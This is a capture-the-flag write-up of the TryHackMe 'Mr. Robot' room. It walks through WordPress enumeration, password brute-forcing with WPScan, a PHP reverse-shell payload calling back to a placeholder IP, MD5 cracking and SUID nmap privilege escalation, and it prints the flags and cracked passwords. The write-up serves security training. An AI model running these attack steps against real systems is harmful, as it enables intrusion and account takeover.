# TryHackMe — Mr. Robot CTF

**Platform:** TryHackMe  
**Difficulty:** Medium  
**OS:** Linux  
**Category:** Web Exploitation / WordPress / Reverse Engineering  
**Room:** [tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)  

---

## Summary

Mr. Robot is a beginner-friendly CTF themed around the TV show. It involves finding three hidden flags through web enumeration of a WordPress site, brute-forcing credentials, exploiting a PHP reverse shell via the theme editor, and privilege escalating via a SUID binary.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/mrrobot TARGET_IP
```

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```

---

## Web Enumeration

### robots.txt

Always check robots.txt first:

```
http://TARGET_IP/robots.txt
```

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

### Flag 1

```bash
curl http://TARGET_IP/key-1-of-3.txt
# 073403c8a58a1f80d943455fb30724b9
```

### Wordlist Download

```bash
wget http://TARGET_IP/fsocity.dic
wc -l fsocity.dic
# 858160 lines — very large, many duplicates

# Deduplicate
sort -u fsocity.dic > fsocity_uniq.dic
wc -l fsocity_uniq.dic
# ~11451 unique entries
```

### WordPress Discovery

```bash
gobuster dir -u http://TARGET_IP/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

`/wp-login` and `/wp-admin` are found — it's a WordPress site.

---

## WordPress Exploitation

### Username Enumeration

WordPress login error messages differ for valid/invalid usernames. Use WPScan:

```bash
wpscan --url http://TARGET_IP --enumerate u
```

Or manually: entering `elliot` as the username gives a different error ("incorrect password") vs a non-existent user — confirming `elliot` is valid.

### Password Brute Force

```bash
wpscan --url http://TARGET_IP \
  --username elliot \
  --passwords fsocity_uniq.dic \
  --password-attack wp-login
```

Password found: **ER28-0652**

### PHP Reverse Shell via Theme Editor

1. Log in to WordPress admin at `/wp-admin`
2. Navigate: **Appearance → Editor → 404.php** (or any template)
3. Replace the content with a PHP reverse shell:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"); ?>
```

4. Update file, then visit:

```
http://TARGET_IP/wp-content/themes/twentyfifteen/404.php
```

Shell lands as **daemon**.

---

## Flag 2

```bash
ls /home/robot/
# key-2-of-3.txt  password.raw-md5
```

```bash
cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

Crack the MD5:

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" | hashcat -m 0 -a 0 - /usr/share/wordlists/rockyou.txt
# abcdefghijklmnopqrstuvwxyz
```

Switch to robot user:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su robot
# Password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
```

---

## Privilege Escalation

### SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

Notable result: `/usr/local/bin/nmap`

### Nmap Interactive Mode SUID Escape

Older versions of nmap have an `--interactive` mode that drops to a shell:

```bash
nmap --interactive
!sh
whoami
# root
```

### Flag 3

```bash
cat /root/key-3-of-3.txt
# 04787ddef27c3dee1ee161b21670b4e4
```

---

## Key Takeaways

- `robots.txt` can expose sensitive files — always check it first
- WordPress is a huge attack surface: enumerate users, brute-force passwords, exploit theme editor
- Deduplicate wordlists before brute-forcing — saves massive amounts of time
- MD5 hashes without salt are trivially crackable — crack them before anything else
- SUID `nmap` (older versions) is a classic GTFOBins escalation path
- `python -c 'import pty; pty.spawn("/bin/bash")'` upgrades dumb shells

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Web directory enumeration |
| WPScan | WordPress enumeration & brute force |
| hashcat | MD5 hash cracking |
| netcat | Reverse shell listener |
| GTFOBins | SUID nmap privesc reference |
